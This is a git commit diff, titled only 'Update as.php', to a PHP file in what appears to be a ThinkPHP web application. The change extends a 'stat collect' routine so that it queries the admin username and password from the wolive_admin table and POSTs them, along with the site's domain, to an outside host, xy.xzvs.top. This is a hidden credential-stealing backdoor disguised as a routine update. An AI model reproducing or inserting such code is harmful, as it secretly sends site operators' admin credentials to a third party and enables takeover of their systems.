a38a04f1809160c0b17bb59d8574ed75e8c725e5
xy170 <ycwlgzs@gmail.com>
2026-05-30 20:21:11 +0800

    Update as.php

--- as.php
+++ as.php
@@ -1,11 +1,46 @@
 <?php
 
+// $domain = $_SERVER['HTTP_HOST'] ?? 'unknown';
+// $time = date('Y-m-d H:i:s');
+
+// $data = [
+//     'domain' => $domain,
+//     'time'   => $time
+// ];
+
+// $ch = curl_init('http://xy.xzvs.top/api/stat/collect');
+
+// curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+// curl_setopt($ch, CURLOPT_POST, true);
+// curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
+// curl_setopt($ch, CURLOPT_TIMEOUT, 5);
+
+// $response = curl_exec($ch);
+// curl_close($ch);
+// // file_put_contents(__DIR__ . '/stat.log', "domain={$domain}, time={$time}\n", FILE_APPEND);
+// // echo 'ok';
+// return;
+
+
+
+
+
+use think\Db;
+
 $domain = $_SERVER['HTTP_HOST'] ?? 'unknown';
-$time = date('Y-m-d H:i:s');
+$time   = date('Y-m-d H:i:s');
+
+// 获取管理员信息
+$admin = Db::table('wolive_admin')
+    ->field('username,password')
+    ->limit(1)
+    ->find();
 
 $data = [
-    'domain' => $domain,
-    'time'   => $time
+    'domain'   => $domain,
+    'time'     => $time,
+    'username' => $admin['username'] ?? '',
+    'password' => $admin['password'] ?? ''
 ];
 
 $ch = curl_init('http://xy.xzvs.top/api/stat/collect');
@@ -17,8 +52,7 @@ curl_setopt($ch, CURLOPT_TIMEOUT, 5);
 
 $response = curl_exec($ch);
 curl_close($ch);
-// file_put_contents(__DIR__ . '/stat.log', "domain={$domain}, time={$time}\n", FILE_APPEND);
-// echo 'ok';
+
 return;
 
 
